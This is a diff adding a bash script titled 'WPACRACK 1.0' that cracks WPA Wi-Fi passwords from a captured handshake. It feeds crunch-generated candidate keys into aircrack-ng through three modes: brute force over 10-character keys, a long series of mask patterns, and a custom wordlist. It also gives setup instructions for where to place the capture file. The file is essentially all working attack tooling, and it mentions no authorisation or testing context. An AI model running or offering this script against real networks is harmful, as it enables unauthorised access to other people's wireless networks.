@@ -1,0 +1,135 @@
+#!/bin/bash
+ 
+readuser="$(whoami)"
+expecteduser="root"
+ 
+if [ "$readuser" == "$expecteduser" ]; then
+    clear
+	handshake='/root/WPACRACK/WPACRACK.cap'
+	aircrack-ng $handshake > '/root/WPACRACK/temp'
+	bssid=$(awk '{for(i=1;i<=NF;i++) if ($i=="WPA") print $(i-2)}' '/root/WPACRACK/temp')
+	Sequential(){
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,,%%%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%,%%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%,%%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%,%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%,%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%%,%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%%%,%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%%%%,%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%%%%%,% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t ,%%%%%%%%%, -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,,%%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,,%%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%,%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%,%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%%,%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%%%,%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%%%%,%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%%%%%,% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %,%%%%%%%, -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,,%%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%,%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%%,%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%%%,%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%%%%,%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%%%%%,% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%,%%%%%%, -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,,%%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,%,%%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,%%,%%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,%%%,%% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,%%%%,% -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%,%%%%%, -i | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%,,%%%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%,%,%%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%,%%,%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%,%%%,% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%,%%%%, | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%,,%%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%,%,%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%,%%,% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%,%%%, | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%,,%% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%,%,% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%,%%, | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%%,,% | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%%,%, | aircrack-ng $handshake --bssid $bssid -w-
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -t %%%%%%%%,, | aircrack-ng $handshake --bssid $bssid -w-
+	}
+	Bruteforce(){
+		crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng $handshake --bssid $bssid -w-
+	}
+	CustomAttack(){
+		aircrack-ng $handshake --bssid $bssid -w '/root/WPACRACK/WORDLIST'
+	}
+	echo -e "
+		\e[31mWPACRACK 1.0		
+	
+		\e[33m==========================================================================
+			
+						IMPORTANT!
+	
+			BEFORE YOU START THE SCRIPT, CHECK THESE IMPORTANTS SETS:
+			
+			\e[33m1) \e[31mMake a directory in your /root path called 'WPACRACK'
+			\e[33m2) \e[31mPut your .cap handshake file inside the 'WPACRACK' folder
+			\e[33m3) \e[31mRename your .cap handshake file to 'WPACRACK.cap'
+		
+		       \e[34mTHIS SCRIPT MAY TAKE SOME TIME, SO CONSIDER USING IT WITH A
+			     PORTABLE DEVICE, SERVER CLIENT, OR GPU TO CRACK!
+			
+		\e[33m==========================================================================\e[0m"
+	read ENTER
+	echo -e "
+			     \e[33mYOU ALSO HAVE TO SPECIFY WHICH SERVICE YOU WANT:
+			
+					   1\e[0m -> \e[31mBRUTEFORCE
+					   \e[33m2\e[0m -> \e[34mSEQUENTIAL
+					   \e[33m3\e[0m -> \e[32mCUSTOM ATTACK
+		
+		\e[33m==========================================================================\e[0m
+	"
+	read service
+	case $service in
+	"1")
+		echo -e "
+		      \e[1;31mIF YOU WANT TO STOP THIS SCRIPT, JUST CLOSE THE TERMINAL.\e[0m
+	"
+		sleep 5
+		Bruteforce
+		rm '/root/WPACRACK/temp'
+		exit
+	;;
+	"2")
+		echo -e "
+		      \e[1;31mIF YOU WANT TO STOP THIS SCRIPT, JUST CLOSE THE TERMINAL.\e[0m
+	"
+		sleep 5
+		Sequential
+		rm '/root/WPACRACK/temp'
+		exit
+	;;
+	"3")
+		echo -e "
+		    \e[33mMOVE YOUR WORDLIST TO 'WPACRACK' FOLDER AND RENAME AS 'WORDLIST'\e[0m
+	"
+		read ENTER
+		echo -e "
+		      \e[1;31mIF YOU WANT TO STOP THIS SCRIPT, JUST CLOSE THE TERMINAL.\e[0m
+	"
+		CustomAttack
+		rm '/root/WPACRACK/temp'
+		exit
+	;;
+	*)
+		echo -e "
+				     \e[1;31mWRONG OPTION! CLOSING...\e[0m
+	"
+		rm '/root/WPACRACK/temp'
+		exit
+	esac
+else
+    echo "This script is meant to be runned as ROOT!"
+fi
+
